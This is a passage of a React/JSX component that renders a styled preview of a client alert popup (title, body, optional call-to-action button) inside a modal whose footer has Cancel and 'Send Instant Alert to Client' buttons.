                          borderRadius: '8px',
                          padding: isTop ? '12px 16px' : '22px 24px',
                          border: `2px solid ${variantColor}`,
                          boxShadow: `0 0 25px ${variantColor}44, 0 8px 30px rgba(0,0,0,0.7)`,
                          position: 'relative',
                          textAlign: 'center',
                          color: '#eaecef',
                          transition: 'all 0.2s ease',
                        }}
                      >
                        {/* Close button */}
                        <div style={{ position: 'absolute', top: '10px', right: '14px', color: '#848e9c', fontSize: '14px' }}>
                          ✕
                        </div>

                        {/* Title */}
                        <div
                          style={{
                            fontSize: '18px',
                            fontWeight: 700,
                            color: variantColor,
                            marginBottom: '6px',
                          }}
                        >
                          {alertForm.title}
                        </div>

                        {/* Message */}
                        <div style={{ fontSize: '13px', color: '#cfd6e0', marginBottom: '14px', maxWidth: '440px', margin: '0 auto 12px' }}>
                          {alertForm.body}
                        </div>

                        {/* Button */}
                        {alertForm.ctaText && (
                          <div style={{ display: 'inline-block' }}>
                            <span
                              style={{
                                display: 'inline-block',
                                padding: '8px 24px',
                                background: variantColor,
                                color: alertForm.variant === 'warning' || alertForm.variant === 'success' ? '#000000' : '#ffffff',
                                borderRadius: '6px',
                                fontWeight: 700,
                                fontSize: '13px',
                                boxShadow: '0 2px 10px rgba(0,0,0,0.3)',
                              }}
                            >
                              {alertForm.ctaText}
                            </span>
                          </div>
                        )}
                      </div>
                    );
                  })()}
                </div>
              </div>

              <div className="modal-footer">
                <button
                  type="button"
                  className="btn btn-secondary"
                  onClick={() => setShowAlertModal(false)}
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  className="btn btn-primary"
                  style={{ background: 'var(--brand-purple)', padding: '10px 22px' }}
                >
                  🚀 Send Instant Alert to Client
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
}
